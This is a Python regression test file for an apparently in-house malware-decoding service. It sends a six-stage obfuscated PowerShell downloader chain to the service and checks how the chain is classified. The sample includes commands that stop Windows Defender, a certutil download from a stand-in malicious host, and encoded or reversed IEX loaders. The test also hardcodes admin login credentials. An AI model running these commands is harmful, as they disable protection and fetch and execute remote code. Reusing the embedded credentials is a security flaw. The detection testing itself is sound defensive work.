"""Regression tests for Feb-2026 multi-command chain routing fix (iteration_10)."""
import os
import requests

BASE_URL = os.environ.get("REACT_APP_BACKEND_URL", "https://greeting-app-5782.preview.emergentagent.com").rstrip("/")

SIX_STAGE = """powershell -w hidden -c "sc.exe stop WinDefend"
powershell -nop -w hidden -c "$h='73632e6578652073746f702057696e446566656e64';$c=[regex]::matches($h,'..')|%{$_.value};$f=($c|%{[char][int]('0x'+$_)})-join'';iex $f"
cmd.exe /c certutil.exe -urlcache -f http://malicious-domain.com %temp%\\p.exe
(New-Object Net.WebClient).DownloadString('http://127.0.0')
powershell -NoP -C "IEX (([string[]]('1sp.s/1.0.0.721//:ptth','(tneilCbeW.teN tcejbO-weN)')[1..0] |% {$e=$_;$r='';for($i=$e.Length-1;$i -ge 0;$i-- ){$r+=$e[$i]};$r}) -join '.DownloadString')"
powershell -NoProfile -WindowStyle Hidden -Command "IO.Compression.GzipStream"
$b='H4sICG06mFwCA2NvZGUAc0vNKy7PL8pJUQQAlp9pDwwAAAA=';
$m=New-Object IO.MemoryStream(,[Convert]::FromBase64String($b));
$g=New-Object IO.Compression.GzipStream($m,[IO.Compression.CompressionMode]::Decompress);
$r=New-Object IO.StreamReader($g);
IEX $r.ReadToEnd();"""


def _login():
    r = requests.post(f"{BASE_URL}/api/auth/login", json={
        "email": "admin@nivxray.com", "password": "NivXRay#2026!"
    }, timeout=30)
    assert r.status_code == 200, r.text
    j = r.json()
    return j.get("access_token") or j.get("token")


def _split_six():
    # simulate the frontend commandSplitter grouping — 6 stages
    lines = SIX_STAGE.split("\n")
    groups = []
    for ln in lines:
        t = ln.strip()
        if not t:
            continue
        if groups and (t.startswith("$") or t.startswith(")") or t.startswith("}") or t.lower().startswith("iex $")):
            groups[-1] += "\n" + ln
        else:
            groups.append(ln)
    return groups


def test_chain_six_stages():
    token = _login()
    stages = _split_six()
    assert len(stages) == 6, f"expected 6 stages, got {len(stages)}: {stages}"
    r = requests.post(f"{BASE_URL}/api/decode/chain",
                      headers={"Authorization": f"Bearer {token}"},
                      json={"stages": [{"input": s} for s in stages]},
                      timeout=90)
    assert r.status_code == 200, r.text
    data = r.json()
    assert data.get("stage_count") == 6, data.get("stage_count")
    agg = data.get("aggregate", {})
    fam = (agg.get("family") or {}).get("family", "")
    assert "PowerShell Downloader" in fam or "Downloader" in fam, f"family={fam}"
    risk = agg.get("risk", {})
    assert risk.get("verdict") == "Malicious", risk
    urls = (agg.get("iocs") or {}).get("urls", [])
    urls_join = " ".join(urls)
    assert "malicious-domain.com" in urls_join, urls
    mitre_ids = [m.get("id") if isinstance(m, dict) else m for m in (agg.get("mitre") or [])]
    assert "T1140" in mitre_ids, mitre_ids
    assert "T1105" in mitre_ids, mitre_ids


def test_smart_singleline_unaffected():
    token = _login()
    r = requests.post(f"{BASE_URL}/api/decode/smart",
                      headers={"Authorization": f"Bearer {token}"},
                      json={"input": 'powershell -w hidden -c "sc.exe stop WinDefend"'},
                      timeout=30)
    assert r.status_code == 200, r.text
    data = r.json()
    assert "stage_count" not in data, data.keys()
    assert "stages" not in data or not isinstance(data.get("stages"), list) or len(data.get("stages", [])) == 0, \
        f"single-line should not include stages list, got {list(data.keys())}"
